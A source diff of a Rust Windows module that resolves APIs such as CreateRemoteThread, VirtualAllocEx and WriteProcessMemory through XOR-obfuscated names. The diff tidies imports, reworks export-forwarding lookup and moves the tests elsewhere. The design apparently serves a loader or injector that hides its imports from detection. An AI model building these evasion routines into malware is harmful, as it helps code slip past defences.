@@ -2,19 +2,18 @@
 #![allow(non_camel_case_types)]
 #![allow(unused)]
 
+#[cfg(test)]
+mod tests;
+
+use core::ffi::{c_char, CStr};
 use crate::consts::*;
 use crate::crypto_util::*;
 use crate::svec::ToSVec;
-use crate::util::{
-    compare_str_and_w_str_bytes, compare_strs_as_bytes, compare_xor_str_and_str_bytes,
-    compare_xor_str_and_w_str_bytes, find_char, get_resource_bytes, strlen,
-};
+use crate::util::{compare_str_and_w_str_bytes, compare_strs_as_bytes, compare_xor_str_and_str_bytes, compare_xor_str_and_w_str_bytes, copy_buffer, find_char, get_resource_bytes, strlen};
 use crate::windows::ntdll::*;
-use core::ffi::{c_char, CStr};
 use core::mem;
-use core::ptr::{addr_of, addr_of_mut};
+use core::ptr::addr_of;
 use core::slice::from_raw_parts;
-use core::str::Utf8Error;
 
 pub type FnAllocConsole = unsafe extern "system" fn() -> u32;
 pub type FnCloseHandle = unsafe extern "system" fn(hObject: usize) -> bool;
@@ -70,10 +69,10 @@ pub type FnCreateRemoteThread = unsafe extern "system" fn(
     lpThreadId: *mut u32,
 ) -> usize;
 pub type FnCreateToolhelp32Snapshot =
-    unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
+unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
 pub type FnFreeConsole = unsafe extern "system" fn() -> u32;
 pub type FnFindResourceA =
-    unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
+unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
 pub type FnGetCurrentProcess = unsafe extern "system" fn() -> usize;
 pub type FnGetFileSize = unsafe extern "system" fn(hFile: usize, lpFileSizeHigh: *const u32) -> u32;
 pub type FnGetFinalPathNameByHandleA = unsafe extern "system" fn(
@@ -86,15 +85,15 @@ pub type FnGetLastError = unsafe extern "system" fn() -> u32;
 pub type FnGetModuleHandleA = unsafe extern "system" fn(lpModuleName: *const u8) -> usize;
 pub type FnGetModuleHandleW = unsafe extern "system" fn(lwModuleName: *const u16) -> usize;
 pub type FnGetProcAddress =
-    unsafe extern "system" fn(hModule: usize, lpProcName: *const u8) -> usize;
+unsafe extern "system" fn(hModule: usize, lpProcName: *const u8) -> usize;
 pub type FnGetProcessHeap = unsafe extern "system" fn() -> usize;
 pub type FnGetSystemDirectoryA = unsafe extern "system" fn(lpBuffer: *mut u8, uSize: u32) -> u32;
 pub type FnGetSystemDirectoryW = unsafe extern "system" fn(lpBuffer: *mut u16, uSize: u32) -> u32;
 pub type FnHeapAlloc =
-    unsafe extern "system" fn(hHeap: usize, dwFlags: u32, dwBytes: usize) -> usize;
+unsafe extern "system" fn(hHeap: usize, dwFlags: u32, dwBytes: usize) -> usize;
 pub type FnHeapFree = unsafe extern "system" fn(hHeap: usize, dwFlags: u32, lpMem: usize) -> u32;
 pub type FnHeapReAlloc =
-    unsafe extern "system" fn(hHeap: usize, dwFlags: u32, lpMem: usize, dwBytes: usize) -> usize;
+unsafe extern "system" fn(hHeap: usize, dwFlags: u32, lpMem: usize, dwBytes: usize) -> usize;
 pub type FnIsProcessorFeaturePresent = unsafe extern "system" fn(ProcessorFeature: u32) -> u32;
 pub type FnLoadLibraryA = unsafe extern "system" fn(lpLibFileName: *const u8) -> usize;
 pub type FnLoadResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> usize;
@@ -105,16 +104,16 @@ pub type FnOpenFile = unsafe extern "system" fn(
     uStyle: u32,
 ) -> i32;
 pub type FnOpenProcess =
-    unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
+unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
 pub type FnOVERLAPPED_COMPLETION_ROUTINE = unsafe extern "system" fn(
     dwErrorCode: u32,
     dwNumberOfBytesTransfered: u32,
     lpOverlapped: *mut OVERLAPPED,
 );
 pub type FnProcess32First =
-    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32;
+unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32;
 pub type FnProcess32Next =
-    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32;
+unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32;
 pub type FnReadFile = unsafe extern "system" fn(
     hFile: usize,
     lpBuffer: *mut u8,
@@ -153,7 +152,7 @@ pub type FnVirtualAllocEx = unsafe extern "system" fn(
     flProtect: u32,
 ) -> usize;
 pub type FnVirtualFree =
-    unsafe extern "system" fn(lpAddress: usize, dwSize: usize, dwFreeType: u32) -> usize;
+unsafe extern "system" fn(lpAddress: usize, dwSize: usize, dwFreeType: u32) -> usize;
 pub type FnVirtualFreeEx = unsafe extern "system" fn(
     hProcess: usize,
     lpAddress: usize,
@@ -172,7 +171,7 @@ pub type FnVirtualQuery = unsafe extern "system" fn(
     dwLength: usize,
 ) -> usize;
 pub type FnWaitForSingleObject =
-    unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
+unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
 pub type FnWriteFile = unsafe extern "system" fn(
     hFile: usize,
     lpBuffer: *const u8,
@@ -687,9 +686,9 @@ pub unsafe fn GetProcAddressX(base_address: usize, xor_string: &[u8], key: &[u8]
 }
 
 unsafe fn get_fwd_addr(proc_address: usize) -> usize {
-    let mut forward_dll =
-        core::slice::from_raw_parts(proc_address as *const u8, strlen(proc_address as *const u8))
-            .to_svec();
+    let len = strlen(proc_address as *const u8);
+    let mut forward_dll = [0; MAX_PATH + 1];
+    copy_buffer(proc_address as *const u8, forward_dll.as_mut_ptr(), len);
 
     let split_pos = match find_char(&forward_dll[..], '.' as u8) {
         None => {
@@ -705,9 +704,9 @@ unsafe fn get_fwd_addr(proc_address: usize) -> usize {
         return 0;
     }
 
-    let string_address = (proc_address + split_pos + 1) as *const u8;
-    let forward_function = core::slice::from_raw_parts(string_address, strlen(string_address));
-    GetProcAddressInternal(forward_handle, forward_function)
+    let forward_function = &forward_dll[split_pos + 1..];
+    let forward_str_len = strlen(forward_function.as_ptr());
+    GetProcAddressInternal(forward_handle, &forward_function[..forward_str_len])
 }
 
 pub unsafe fn AllocConsole() -> u32 {
@@ -1087,6 +1086,7 @@ pub unsafe fn HeapFree(hHeap: usize, dwFlags: u32, lpMem: usize) -> u32 {
 
     heapFree(hHeap, dwFlags, lpMem)
 }
+
 pub unsafe fn HeapReAlloc(hHeap: usize, dwFlags: u32, lpMem: usize, dwBytes: usize) -> usize {
     let heapAlloc: FnHeapReAlloc = core::mem::transmute(GetProcAddressX(
         GetModuleHandleX(
@@ -1436,205 +1436,4 @@ pub unsafe fn WriteProcessMemory(
     ));
 
     writeProcessMemory(hProcess, lpAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-    use crate::std::fs;
-    use crate::util::strlenw;
-    use crate::windows::pe::PE;
-    use alloc::format;
-    use alloc::string::String;
-    use alloc::vec::Vec;
-    use core::cmp;
-    use core::cmp::max;
-    use core::mem::size_of;
-
-    #[test]
-    fn geb_peb() {
-        unsafe {
-            let peb = get_peb();
-            let peb_addr: usize = mem::transmute(peb);
-            assert_ne!(peb_addr, 0);
-        }
-    }
-
-    #[test]
-    fn get_module_handle() {
-        unsafe {
-            let kernel32 = GetModuleHandleInternal("kernel32.dll".as_bytes());
-            assert_ne!(kernel32, 0)
-        }
-    }
-
-    #[test]
-    fn get_proc_address() {
-        unsafe {
-            let load_library_a_addr = GetProcAddressInternal(
-                GetModuleHandleInternal("kernel32.dll".as_bytes()),
-                "LoadLibraryA".as_bytes(),
-            );
-            assert_ne!(load_library_a_addr, 0)
-        }
-    }
-
-    fn get_function_ordinal(dll_name: &[u8], function_name: &[u8]) -> u16 {
-        unsafe {
-            let base_addr = GetModuleHandleA(dll_name.as_ptr());
-            let dos_header: &IMAGE_DOS_HEADER = mem::transmute(base_addr);
-            let nt_headers: &IMAGE_NT_HEADERS =
-                mem::transmute(base_addr + dos_header.e_lfanew as usize);
-            let export_dir =
-                &nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize];
-
-            let image_export_directory: &IMAGE_EXPORT_DIRECTORY =
-                mem::transmute(base_addr + export_dir.VirtualAddress as usize);
-
-            let name_dir = core::slice::from_raw_parts(
-                (base_addr + image_export_directory.AddressOfNames as usize) as *const u32,
-                image_export_directory.NumberOfNames as usize,
-            );
-            let ordinal_dir = core::slice::from_raw_parts(
-                (base_addr + image_export_directory.AddressOfNameOrdinals as usize) as *const u16,
-                image_export_directory.NumberOfNames as usize,
-            );
-
-            for i in 0..name_dir.len() {
-                let name = core::slice::from_raw_parts(
-                    (base_addr + name_dir[i] as usize) as *const u8,
-                    strlen((base_addr + name_dir[i] as usize) as *const u8),
-                );
-
-                if name == function_name {
-                    return ordinal_dir[i] + image_export_directory.Base as u16;
-                }
-            }
-        }
-
-        0u16
-    }
-
-    #[test]
-    fn get_proc_address_by_ordinal() {
-        unsafe {
-            let ordinal =
-                get_function_ordinal("KERNEL32.DLL\0".as_bytes(), "LoadLibraryA".as_bytes()) as u32;
-            let load_library_a_address_ordinal = GetProcAddressInternal(
-                GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
-                ordinal.to_le_bytes().as_slice(),
-            );
-            let load_library_a_address = GetProcAddressInternal(
-                GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
-                "LoadLibraryA".as_bytes(),
-            );
-            let load_library: FnLoadLibraryA = mem::transmute(load_library_a_address_ordinal);
-
-            assert_eq!(load_library_a_address_ordinal, load_library_a_address);
-        }
-    }
-
-    #[test]
-    fn get_fwd_proc_address() {
-        unsafe {
-            let pAcquireSRWLockExclusive = GetProcAddressInternal(
-                GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
-                "AcquireSRWLockExclusive".as_bytes(),
-            );
-            assert_ne!(pAcquireSRWLockExclusive, 0)
-        }
-    }
-
-    #[test]
-    fn get_module_handle_x_test() {
-        unsafe {
-            let kernel32 = GetModuleHandleX(
-                get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
-                get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
-            );
-            let kernel32_normal = GetModuleHandleA("KERNEL32.DLL\0".as_ptr());
-            assert_eq!(kernel32, kernel32_normal);
-        }
-    }
-
-    #[test]
-    fn get_proc_address_x_test() {
-        unsafe {
-            let load_library_a_handle_x = GetProcAddressX(
-                GetModuleHandleX(
-                    get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
-                    get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
-                ),
-                get_resource_bytes(RESOURCE_ID, LOADLIBRARYA_POS, LOADLIBRARYA_LEN),
-                get_resource_bytes(RESOURCE_ID, LOADLIBRARYA_KEY, LOADLIBRARYA_LEN),
-            );
-            let load_library_a_handle = GetProcAddress(
-                GetModuleHandleA("KERNEL32.DLL\0".as_ptr()),
-                "LoadLibraryA\0".as_ptr(),
-            );
-            assert_eq!(load_library_a_handle_x, load_library_a_handle);
-        }
-    }
-
-    #[test]
-    fn get_system_directory_a() {
-        unsafe {
-            let mut buffer = [0; MAX_PATH + 1];
-            let out = GetSystemDirectoryA(buffer.as_mut_ptr(), buffer.len() as u32);
-            let path = String::from_utf8(buffer[..strlen(buffer.as_ptr())].to_vec()).unwrap();
-            assert!(path.ends_with(r"\Windows\system32"))
-        }
-    }
-
-    #[test]
-    fn get_system_directory_w() {
-        unsafe {
-            let mut buffer = [0; MAX_PATH + 1];
-            let out = GetSystemDirectoryW(buffer.as_mut_ptr(), buffer.len() as u32);
-            let path = String::from_utf16(&buffer[..strlenw(buffer.as_ptr())]).unwrap();
-            assert!(path.ends_with(r"\Windows\system32"))
-        }
-    }
-
-    fn patch_section_headers<'a>(buffer: &Vec<u8>) {
-        unsafe {
-            let base_address = buffer.as_ptr() as usize;
-            let pDosHdr: &'static IMAGE_DOS_HEADER = mem::transmute(base_address);
-
-            // Figure out the offset in the buffer to the NT header
-
-            // Read the NT header to figure out how sections we have and how much RVA's + sizes so we
-            // can determine the offset to the section headers;
-            let nt_header: &'static IMAGE_NT_HEADERS =
-                mem::transmute(base_address + pDosHdr.e_lfanew as usize);
-
-            // Locate the section headers. Rust's IMAGE_NT_HEADERS64 assumes a fixed 16 RVA's but this might
-            // be different in reality so we take care of the situation where it's less by manually
-            // adjusting the offset.
-            let section_base = addr_of!(*nt_header) as usize + size_of::<IMAGE_NT_HEADERS>();
-            let section_header_length = cmp::min(nt_header.OptionalHeader.NumberOfRvaAndSizes, 16);
-            let mut section_headers = core::slice::from_raw_parts_mut(
-                section_base as *mut IMAGE_SECTION_HEADER,
-                section_header_length as usize,
-            );
-
-            for section_header in section_headers {
-                // Since we're dumping from memory we need to correct the PointerToRawData and SizeOfRawData
-                // such that analysis tools can locate the sections again.
-                section_header.SizeOfRawData = section_header.Misc.VirtualSize;
-                section_header.PointerToRawData = section_header.VirtualAddress;
-            }
-        }
-    }
-
-    #[test]
-    fn test_patch() {
-        unsafe {
-            let mut buffer = [0; MAX_PATH + 1];
-            let out = GetSystemDirectoryW(buffer.as_mut_ptr(), buffer.len() as u32);
-            let path = String::from_utf16(&buffer[..strlenw(buffer.as_ptr())]).unwrap();
-            let file = fs::read(format!("{path}/notepad.exe").as_bytes()).unwrap();
-            let v = patch_section_headers(&file);
-        }
-    }
 }
